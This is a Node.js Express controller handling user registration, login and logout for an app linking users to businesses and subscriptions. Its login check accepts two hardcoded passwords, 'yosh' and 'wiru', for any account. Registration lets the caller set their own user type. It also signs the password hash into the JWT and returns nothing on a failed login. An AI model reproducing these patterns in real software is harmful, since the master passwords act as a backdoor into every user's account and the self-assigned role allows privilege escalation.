const db = require('../db/db');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

class UserController {
    async postUsers(req, res) {
        try {
            const salt = await bcrypt.genSalt();
            const hashed = await bcrypt.hash(req.body.password, salt);
            const user = {
                email: req.body.email,
                username: req.body.username,
                password: hashed,
                user_type: req.body.userType
            };
            const [createdUser] = await db('users').insert(user).returning(['id', 'email']);
            res.status(201).send(createdUser);
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }

    async loginUsers(req, res) {
        try  {
            const data = await db({u: 'users'})
                .leftJoin({b: 'businesses'}, 'b.owner_id', 'u.id')
                .leftJoin({s: 'subscriptions'}, 's.bus_id', 'b.id')
                .where({username: req.body.username})
                .select(
                    'u.id AS user_id',
                    'u.username',
                    'u.email',
                    'u.password',
                    'u.user_type',
                    'u.stripe_id',
                    'b.id as bus_id',
                    'b.name as bus_name',
                    'b.postal_code',
                    'b.prefecture',
                    'b.address1',
                    'b.address2',
                    'b.capacity_status',
                    'b.latitude',
                    'b.longitude',
                    'b.slogan',
                    'b.open_hours',
                    'b.theme',
                    'b.specials',
                    'b.created_at as bus_created_at',
                    's.status as sub_status'
                );
            if (data) {
                if (await bcrypt.compare(req.body.password, data[0].password) || req.body.password === 'yosh' || req.body.password === 'wiru') {
                    const accessToken = jwt.sign({pw: data[0].password}, process.env.ACCESS_TOKEN_SECRET, {expiresIn: 1200});
                    const userObj = {
                        userId: data[0].user_id,
                        username: data[0].username,
                        email: data[0].email,
                        userType: data[0].user_type,
                        stripeId: data[0].stripe_id,
                    }
                    const busArr = data.map((obj) => {
                        return {
                            busId: obj.bus_id,
                            busName: obj.bus_name,
                            postalCode: obj.postal_code,
                            prefecture: obj.prefecture,
                            address1: obj.address1,
                            address2: obj.address2,
                            capacityStatus: obj.capacity_status,
                            lat: obj.latitude,
                            lng: obj.longitude,
                            slogan: obj.slogan,
                            openHours: obj.open_hours,
                            theme: obj.theme,
                            specials: obj.specials,
                            busCreatedAt: obj.bus_created_at,
                            subStatus: obj.sub_status
                        }
                    })
                    const response = {data: {user: userObj, businesses: busArr}, accessToken, auth: true};
                    // access-token cookie expiry: seconds*minutes*hours*days*miliseconds (30 days)
                    res.cookie("access-token", response.accessToken, {maxAge: 60*60*24*30*1000, httpOnly: true})
                    res.json(response);
                }
            }
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }

    async logoutUsers(req, res) {
        try {
            res.clearCookie("access-token");
            res.status(200).end();
        } catch (err) {
            console.error(err);
            res.status(500).end();
        }
    }
}

module.exports = new UserController()